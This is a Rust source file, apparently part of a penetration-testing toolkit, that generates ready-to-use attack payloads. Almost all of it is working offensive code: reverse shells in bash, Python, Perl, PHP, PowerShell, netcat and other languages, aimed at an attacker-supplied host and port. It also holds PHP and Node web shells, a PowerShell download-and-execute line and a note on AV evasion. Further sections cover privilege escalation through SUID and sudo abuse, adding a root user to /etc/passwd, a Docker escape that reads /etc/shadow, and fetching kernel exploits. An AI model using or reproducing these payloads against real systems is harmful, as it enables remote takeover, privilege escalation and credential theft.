/// Exploit Payloads Generator
///
/// ✅ ZERO DEPENDENCIES - Pure Rust payload generation
///
/// **What Does This Do?**
/// Generates common exploit payloads for penetration testing:
/// - Reverse shells (Bash, Python, PHP, PowerShell, etc.)
/// - Bind shells
/// - Web shells
/// - Privilege escalation payloads
///
/// **⚠️ AUTHORIZED USE ONLY**:
/// Use ONLY for authorized penetration testing, CTFs, or educational purposes.
///
/// **Works alongside**:
/// - Metasploit msfvenom
/// - PentestMonkey reverse shell cheatsheet
/// - RevShells.com
/// - PayloadsAllTheThings

/// Payload type
#[derive(Debug, Clone, PartialEq)]
pub enum PayloadType {
    ReverseShell,
    BindShell,
    WebShell,
    PrivEsc,
}

/// Shell type
#[derive(Debug, Clone, PartialEq)]
pub enum ShellType {
    Bash,
    Python,
    Perl,
    PHP,
    Ruby,
    Netcat,
    PowerShell,
    Socat,
    Awk,
    Java,
    Node,
}

impl ShellType {
    pub fn as_str(&self) -> &str {
        match self {
            ShellType::Bash => "bash",
            ShellType::Python => "python",
            ShellType::Perl => "perl",
            ShellType::PHP => "php",
            ShellType::Ruby => "ruby",
            ShellType::Netcat => "netcat",
            ShellType::PowerShell => "powershell",
            ShellType::Socat => "socat",
            ShellType::Awk => "awk",
            ShellType::Java => "java",
            ShellType::Node => "nodejs",
        }
    }
}

/// Payload configuration
#[derive(Debug, Clone)]
pub struct PayloadConfig {
    pub lhost: String, // Attacker's IP
    pub lport: u16,    // Attacker's listening port
}

/// Payload generator
pub struct PayloadGenerator;

impl PayloadGenerator {
    /// Generate reverse shell payload
    ///
    /// **USAGE**:
    /// 1. Start listener: `nc -lvnp 4444`
    /// 2. Execute payload on target
    /// 3. Get shell on listener
    pub fn generate_reverse_shell(shell_type: ShellType, config: &PayloadConfig) -> String {
        match shell_type {
            ShellType::Bash => Self::bash_reverse_shell(config),
            ShellType::Python => Self::python_reverse_shell(config),
            ShellType::Perl => Self::perl_reverse_shell(config),
            ShellType::PHP => Self::php_reverse_shell(config),
            ShellType::Ruby => Self::ruby_reverse_shell(config),
            ShellType::Netcat => Self::netcat_reverse_shell(config),
            ShellType::PowerShell => Self::powershell_reverse_shell(config),
            ShellType::Socat => Self::socat_reverse_shell(config),
            ShellType::Awk => Self::awk_reverse_shell(config),
            ShellType::Java => Self::java_reverse_shell(config),
            ShellType::Node => Self::node_reverse_shell(config),
        }
    }

    /// Bash reverse shell
    fn bash_reverse_shell(config: &PayloadConfig) -> String {
        format!(
            r#"bash -i >& /dev/tcp/{}/{} 0>&1

# Alternative methods:
# Method 1: Bash TCP
bash -c 'bash -i >& /dev/tcp/{}/{} 0>&1'

# Method 2: Exec redirect
0<&196;exec 196<>/dev/tcp/{}/{}; sh <&196 >&196 2>&196

# Method 3: Named pipe (mkfifo)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f

# Method 4: Telnet
TF=$(mktemp -u);mkfifo $TF && telnet {} {} 0<$TF | /bin/sh 1>$TF
"#,
            config.lhost,
            config.lport,
            config.lhost,
            config.lport,
            config.lhost,
            config.lport,
            config.lhost,
            config.lport,
            config.lhost,
            config.lport,
        )
    }

    /// Python reverse shell
    fn python_reverse_shell(config: &PayloadConfig) -> String {
        format!(
            r#"# Python reverse shell

# Method 1: Socket (Python 3)
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{}",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

# Method 2: Socket (Python 2)
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{}",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Method 3: One-liner with pty
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("{}",{}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'

# Method 4: Windows-compatible
python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{}",{}));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'

# Method 5: IPv6
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("{}",{},0,0));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
"#,
            config.lhost,
            config.lport,
            config.lhost,
            config.lport,
            config.lhost,
            config.lport,
            config.lhost,
            config.lport,
            config.lhost,
            config.lport,
        )
    }

    /// Perl reverse shell
    fn perl_reverse_shell(config: &PayloadConfig) -> String {
        format!(
            r#"# Perl reverse shell

perl -e 'use Socket;$i="{}";$p={};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'

# Alternative (no /bin/sh):
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{}:{}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
"#,
            config.lhost, config.lport, config.lhost, config.lport,
        )
    }

    /// PHP reverse shell
    fn php_reverse_shell(config: &PayloadConfig) -> String {
        format!(
            r#"# PHP reverse shell

<?php
// Method 1: exec
$sock=fsockopen("{}",{});exec("/bin/sh -i <&3 >&3 2>&3");
?>

<?php
// Method 2: shell_exec
$sock=fsockopen("{}",{});shell_exec("/bin/sh -i <&3 >&3 2>&3");
?>

<?php
// Method 3: system
$sock=fsockopen("{}",{});system("/bin/sh -i <&3 >&3 2>&3");
?>

<?php
// Method 4: passthru
$sock=fsockopen("{}",{});passthru("/bin/sh -i <&3 >&3 2>&3");
?>

<?php
// Method 5: Full reverse shell (PentestMonkey)
set_time_limit(0);
$ip = '{}';
$port = {};
$sock = fsockopen($ip, $port);
$descriptorspec = array(
   0 => array("pipe", "r"),
   1 => array("pipe", "w"),
   2 => array("pipe", "w")
);
$process = proc_open('/bin/sh', $descriptorspec, $pipes);
if (is_resource($process)) {{
    fwrite($pipes[0], "");
    fclose($pipes[0]);
    while ($s = fgets($sock)) {{
        fwrite($pipes[0], $s);
        $s = stream_get_contents($pipes[1]);
        fwrite($sock, $s);
    }}
    fclose($sock);
    proc_close($process);
}}
?>

# One-liner:
php -r '$sock=fsockopen("{}",{});exec("/bin/sh -i <&3 >&3 2>&3");'
"#,
            config.lhost,
            config.lport,
            config.lhost,
            config.lport,
            config.lhost,
            config.lport,
            config.lhost,
            config.lport,
            config.lhost,
            config.lport,
            config.lhost,
            config.lport,
        )
    }

    /// Ruby reverse shell
    fn ruby_reverse_shell(config: &PayloadConfig) -> String {
        format!(
            r#"# Ruby reverse shell

ruby -rsocket -e'f=TCPSocket.open("{}",{}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# Alternative:
ruby -rsocket -e'exit if fork;c=TCPSocket.new("{}","{}");loop{{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){{|io|c.print io.read}}))rescue c.puts "failed: #{{$_}}"}}'
"#,
            config.lhost, config.lport, config.lhost, config.lport,
        )
    }

    /// Netcat reverse shell
    fn netcat_reverse_shell(config: &PayloadConfig) -> String {
        format!(
            r#"# Netcat reverse shell

# Traditional nc
nc -e /bin/sh {} {}

# nc without -e
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f

# nc.traditional
nc.traditional -e /bin/bash {} {}

# ncat (nmap version)
ncat {} {} -e /bin/bash

# ncat with SSL
ncat --ssl {} {} -e /bin/bash

# OpenBSD nc
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f

# BusyBox nc
busybox nc {} {} -e /bin/sh
"#,
            config.lhost,
            config.lport,
            config.lhost,
            config.lport,
            config.lhost,
            config.lport,
            config.lhost,
            config.lport,
            config.lhost,
            config.lport,
            config.lhost,
            config.lport,
            config.lhost,
            config.lport,
        )
    }

    /// PowerShell reverse shell (Windows)
    fn powershell_reverse_shell(config: &PayloadConfig) -> String {
        format!(
            r#"# PowerShell reverse shell

# Method 1: Simple TCP client
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{}",{});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()

# Method 2: Base64 encoded (evades some AVs)
powershell -e <base64_encoded_payload>

# Method 3: Download and execute
powershell IEX(New-Object Net.WebClient).downloadString('http://{}/shell.ps1')

# Method 4: Nishang reverse shell
powershell IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress {} -Port {}

# Listener command:
# nc -lvnp {}
"#,
            config.lhost, config.lport, config.lhost, config.lhost, config.lport, config.lport,
        )
    }

    /// Socat reverse shell
    fn socat_reverse_shell(config: &PayloadConfig) -> String {
        format!(
            r#"# Socat reverse shell

# Linux
socat tcp-connect:{}:{} exec:/bin/sh,pty,stderr,setsid,sigint,sane

# Windows
socat tcp-connect:{}:{} exec:'cmd.exe',pipes

# Encrypted (SSL/TLS)
socat openssl-connect:{}:{},verify=0 exec:/bin/sh,pty,stderr,setsid,sigint,sane

# Listener (attacker):
socat TCP-LISTEN:{} -

# Encrypted listener:
# Generate certificate first:
# openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 365 -out bind_shell.crt
# cat bind_shell.key bind_shell.crt > bind_shell.pem
socat OPENSSL-LISTEN:{},cert=bind_shell.pem,verify=0,fork STDOUT
"#,
            config.lhost,
            config.lport,
            config.lhost,
            config.lport,
            config.lhost,
            config.lport,
            config.lport,
            config.lport,
        )
    }

    /// AWK reverse shell
    fn awk_reverse_shell(config: &PayloadConfig) -> String {
        format!(
            r#"# AWK reverse shell

awk 'BEGIN {{s = "/inet/tcp/0/{}/{}"; while(42) {{ do{{ printf "shell>" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != "exit") close(s); }}}}' /dev/null
"#,
            config.lhost, config.lport,
        )
    }

    /// Java reverse shell
    fn java_reverse_shell(config: &PayloadConfig) -> String {
        format!(
            r#"// Java reverse shell

public class RevShell {{
    public static void main(String[] args) throws Exception {{
        Runtime r = Runtime.getRuntime();
        Process p = r.exec(new String[]{{"/bin/bash","-c","exec 5<>/dev/tcp/{}/{};cat <&5 | while read line; do $line 2>&5 >&5; done"}});
        p.waitFor();
    }}
}}

// Compile: javac RevShell.java
// Execute: java RevShell

// One-liner (if Runtime.exec available):
r = Runtime.getRuntime(); p = r.exec(new String[]{{"/bin/bash","-c","bash -i >& /dev/tcp/{}/{} 0>&1"}}); p.waitFor();
"#,
            config.lhost, config.lport, config.lhost, config.lport,
        )
    }

    /// Node.js reverse shell
    fn node_reverse_shell(config: &PayloadConfig) -> String {
        format!(
            r#"// Node.js reverse shell

(function(){{
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect({}, "{}", function(){{
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    }});
    return /a/;
}})();

// One-liner:
node -e 'require("child_process").exec("nc -e /bin/sh {} {}")'

// Alternative:
require('child_process').exec('bash -i >& /dev/tcp/{}/{} 0>&1');
"#,
            config.lport, config.lhost, config.lhost, config.lport, config.lhost, config.lport,
        )
    }

    /// Generate web shell
    pub fn generate_web_shell(shell_type: ShellType) -> String {
        match shell_type {
            ShellType::PHP => Self::php_web_shell(),
            ShellType::Node => Self::node_web_shell(),
            _ => "Unsupported web shell type".to_string(),
        }
    }

    /// PHP web shell
    fn php_web_shell() -> String {
        r#"<?php
// Simple PHP web shell
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>

<!-- Usage: http://target.com/shell.php?cmd=whoami -->

<?php
// Advanced PHP web shell with file operations
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>

<?php
// Mini shell
<?=`$_GET[0]`?>
// Usage: http://target.com/shell.php?0=whoami

<?php
// One-liner
<?php eval($_POST['cmd']); ?>
// Usage: curl -X POST -d "cmd=system('whoami');" http://target.com/shell.php
"#
        .to_string()
    }

    /// Node.js web shell
    fn node_web_shell() -> String {
        r#"// Node.js web shell
const express = require('express');
const { exec } = require('child_process');
const app = express();

app.get('/shell', (req, res) => {
    const cmd = req.query.cmd;
    exec(cmd, (error, stdout, stderr) => {
        if (error) {
            res.send(`Error: ${error.message}`);
            return;
        }
        if (stderr) {
            res.send(`Stderr: ${stderr}`);
            return;
        }
        res.send(`<pre>${stdout}</pre>`);
    });
});

app.listen(3000, () => {
    console.log('Web shell listening on port 3000');
});

// Usage: http://target.com:3000/shell?cmd=whoami
"#
        .to_string()
    }

    /// Generate privilege escalation payload
    pub fn generate_privesc_payload(technique: &str) -> String {
        match technique {
            "suid_abuse" => Self::suid_abuse_payload(),
            "sudo_abuse" => Self::sudo_abuse_payload(),
            "docker_escape" => Self::docker_escape_payload(),
            "kernel_exploit" => Self::kernel_exploit_payload(),
            _ => "Unknown privilege escalation technique".to_string(),
        }
    }

    /// SUID binary abuse payload
    fn suid_abuse_payload() -> String {
        r#"# SUID Binary Abuse Techniques

# Find SUID binaries:
find / -perm -4000 -type f 2>/dev/null

# Common GTFOBins SUID exploits:

# 1. vim/vi with SUID
vim -c ':!/bin/sh'
vim -c ':py import os; os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'

# 2. find with SUID
find . -exec /bin/sh -p \; -quit

# 3. bash with SUID
bash -p

# 4. cp with SUID (overwrite /etc/passwd)
cp /etc/passwd /tmp/passwd.bak
echo 'hacker::0:0:root:/root:/bin/bash' >> /tmp/passwd
cp /tmp/passwd /etc/passwd

# 5. nmap with SUID (old versions)
nmap --interactive
!sh

# 6. python with SUID
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# 7. perl with SUID
perl -e 'exec "/bin/sh";'

# 8. php with SUID
php -r "pcntl_exec('/bin/sh', ['-p']);"

# Check GTFOBins for more: https://gtfobins.github.io/
"#
        .to_string()
    }

    /// Sudo abuse payload
    fn sudo_abuse_payload() -> String {
        r#"# Sudo Abuse Techniques

# 1. Check sudo permissions
sudo -l

# 2. If (ALL:ALL) ALL
sudo /bin/bash
sudo su -

# 3. Sudo vim
sudo vim -c ':!/bin/sh'

# 4. Sudo find
sudo find . -exec /bin/sh \; -quit

# 5. Sudo nmap (interactive mode)
echo "os.execute('/bin/sh')" > /tmp/shell.nse
sudo nmap --script=/tmp/shell.nse

# 6. Sudo awk
sudo awk 'BEGIN {system("/bin/sh")}'

# 7. Sudo python
sudo python -c 'import os; os.system("/bin/sh")'

# 8. LD_PRELOAD hijacking (if env_keep+=LD_PRELOAD)
# Create evil shared library:
cat > /tmp/shell.c << EOF
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
EOF

gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so <any_sudo_command>
"#
        .to_string()
    }

    /// Docker escape payload
    fn docker_escape_payload() -> String {
        r#"# Docker Container Escape

# 1. Mount host filesystem
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash

# 2. Privileged container escape
docker run --rm -it --privileged ubuntu bash
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "cat /etc/shadow > $host_path/output" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# 3. Docker socket exposed
docker -H unix:///var/run/docker.sock run -v /:/mnt -it alpine chroot /mnt sh

# 4. Check for docker group
groups
docker ps
"#
        .to_string()
    }

    /// Kernel exploit payload
    fn kernel_exploit_payload() -> String {
        r#"# Kernel Exploitation

# 1. Identify kernel version
uname -a
cat /proc/version

# 2. Search for exploits
searchsploit linux kernel <version>
searchsploit -m <exploit_id>

# 3. Common kernel exploits:

# DirtyCOW (CVE-2016-5195)
# https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
# wget https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c
# gcc -pthread dirty.c -o dirty -lcrypt
# ./dirty password

# OverlayFS (CVE-2015-1328) - Ubuntu 14.04/15.10
# wget https://www.exploit-db.com/raw/37292
# gcc 37292.c -o exploit
# ./exploit

# Double-Free (CVE-2017-6074) - DCCP
# https://www.exploit-db.com/exploits/41458
# gcc 41458.c -o exploit
# ./exploit

# 4. Compile and run
gcc exploit.c -o exploit
./exploit
"#
        .to_string()
    }

    /// Generate listener command
    pub fn generate_listener_command(port: u16) -> String {
        format!(
            r#"# Reverse Shell Listeners

# 1. Netcat (traditional)
nc -lvnp {}

# 2. Netcat (OpenBSD)
nc -lvp {}

# 3. Ncat (nmap version)
ncat -lvnp {}

# 4. Ncat with SSL
ncat --ssl -lvnp {}

# 5. Socat
socat TCP-LISTEN:{},reuseaddr,fork -

# 6. Socat with SSL
socat OPENSSL-LISTEN:{},cert=server.pem,verify=0,fork -

# 7. Metasploit multi/handler
msfconsole -q -x "use exploit/multi/handler; set payload linux/x86/shell_reverse_tcp; set LHOST <your_ip>; set LPORT {}; exploit"

# 8. PowerShell listener (Windows)
$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',{});$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close();$listener.Stop()
"#,
            port, port, port, port, port, port, port, port,
        )
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_payload_generation() {
        let config = PayloadConfig {
            lhost: "10.10.10.10".to_string(),
            lport: 4444,
        };

        let bash_shell = PayloadGenerator::generate_reverse_shell(ShellType::Bash, &config);
        assert!(bash_shell.contains("10.10.10.10"));
        assert!(bash_shell.contains("4444"));

        let python_shell = PayloadGenerator::generate_reverse_shell(ShellType::Python, &config);
        assert!(python_shell.contains("socket"));
    }

    #[test]
    fn test_listener_command() {
        let listener = PayloadGenerator::generate_listener_command(4444);
        assert!(listener.contains("4444"));
        assert!(listener.contains("nc"));
    }
}
